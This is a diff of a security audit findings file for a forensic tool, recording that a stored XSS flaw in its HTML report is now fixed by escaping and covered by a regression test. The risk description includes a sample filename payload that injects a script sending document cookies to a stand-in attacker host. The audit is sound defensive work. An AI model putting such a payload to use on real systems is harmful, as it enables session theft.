@@ -1,13 +1,13 @@
 # Audit Findings — Bugs, Security & Forensic Hardening
 
-**Date:** 2026-07-10 · **Updated:** 2026-07-11
+**Date:** 2026-07-10 · **Updated:** 2026-07-11 · **Last verified:** 2026-07-11
 **Consolidates** the old `01_CODE_REVIEW_AND_BUGS.md` + `02_SECURITY_AND_FORENSIC_AUDIT.md` into one file. No information was removed — this is a merge, not a rewrite.
 
 ---
 
 ## Part 1 — Code Correctness Bugs
 
-> **Status:** every correctness finding below has been **fixed**. 254 tests pass. Kept as a changelog with file/line pointers — not open work.
+> **Status:** every correctness finding below has been **fixed**. 255 tests pass. Kept as a changelog with file/line pointers — not open work.
 
 ### Severity legend
 
@@ -60,7 +60,7 @@
 | ID | Severity | Title | Status |
 | --- | --- | --- | --- |
 | S1 | 🔴 High | MD5 used for integrity/tamper-evidence and as dedup default | ✅ Fixed |
-| S2 | 🔴 High | Forensic HTML report is vulnerable to stored HTML/JS injection (XSS) | ⏳ Open |
+| S2 | 🔴 High | Forensic HTML report is vulnerable to stored HTML/JS injection (XSS) | ✅ Fixed |
 | S3 | 🟠 Medium | Symlink-following scan → scope escape, TOCTOU, recursion DoS | ✅ Fixed |
 | S4 | 🟠 Medium | `restore_from_trash` trusts attacker-controllable `.trashinfo` path → arbitrary write | ⏳ Open |
 | S5 | 🟠 Medium | Plugin loader executes arbitrary local Python with full app privileges | ⏳ Open |
@@ -76,11 +76,11 @@
 ### ✅ S1 — MD5 as the integrity and de-duplication digest *(Fixed)*
 Config default `hash_algorithm` is now `sha256`; `IntegrityMonitor` reads from config and writes self-describing snapshots; duplicate deletion byte-verifies each group.
 
-### 🔴 S2 — Stored HTML/JS injection in the forensic HTML report *(Open)*
-- **Where:** `modules/forensics.py:577-621` (`_forensic_report_html`).
+### ✅ S2 — Stored HTML/JS injection in the forensic HTML report *(Fixed)*
+- **Where:** `dataforge/modules/forensics.py:581-625` (`_forensic_report_html`).
 - Attacker-influenced strings (`username`, `home`, `shell`, `filename`) are concatenated into HTML with **no escaping**.
 - **Risk:** an evidence artefact named `"><script>fetch('//attacker/'+document.cookie)</script>.jpg` becomes live script when opened in a browser — stored XSS in examiner context. Disqualifying for court-grade output.
-- **Fix:** HTML-escape every interpolated value (`html.escape(str(v))`). Add regression test with `<script>`-laden input.
+- **Fix:** every interpolated value is now passed through `html.escape(str(v))`. Regression test `test_forensic_report_html_escapes_script_filename` in `tests/test_new_modules.py` asserts a `<script>` filename is neutralized in the rendered report.
 
 ### ✅ S3 — Symlink-following scan *(Fixed)*
 `scan_directory` now skips symlinks with `follow_symlinks=False` everywhere (see M3 above).
@@ -125,15 +125,15 @@ Config default `hash_algorithm` is now `sha256`; `IntegrityMonitor` reads from c
 | --- | --- | --- |
 | Read-only evidence handling | ⚠️ Partial | Carving/parsing read-only; add explicit "read-only evidence" mode. |
 | Authoritative hashing (SHA-256) | ✅ | Default is SHA-256 (S1 fixed); every manifest uses config's algorithm. |
-| Report integrity / non-repudiation | ❌ | Reports plain files, world-readable (S12), HTML-injectable (S2). Escape output, hash reports, restrict perms. |
+| Report integrity / non-repudiation | ❌ | Reports plain files, world-readable (S12). HTML output now escaped (S2 fixed) - still need to hash reports and restrict perms. |
 | Deterministic, timezone-aware timestamps | ⚠️ Partial | Timeline uses UTC; report uses naive/local. Standardise on UTC ISO-8601. |
 | Chain-of-custody / audit log | ❌ | No tamper-evident action log. Add append-only audit trail for evidence ops. |
 | Tool/version + input provenance in reports | ⚠️ Partial | Add tool version, host, operator, and input hashes. |
-| Hostile-input hardening | ❌/⚠️ | S2, S9, S13, S3 above. |
+| Hostile-input hardening | ❌/⚠️ | S9, S13 remain; S2 fixed. |
 
 ## Recommended remediation order
 
-1. **S2** (report XSS) — directly undermines forensic value proposition; cheap to fix.
+1. ~~**S2** (report XSS)~~ — **fixed**: `html.escape()` on every interpolated value + regression test.
 2. **S4 / S7** — highest real-world blast radius (arbitrary write, blanket data loss).
 3. **S5 / S6 / S8** — code-exec surface, false-security control, secret hygiene.
 4. **S9–S13** — hardening batchable with linting/dependency work from the roadmap.
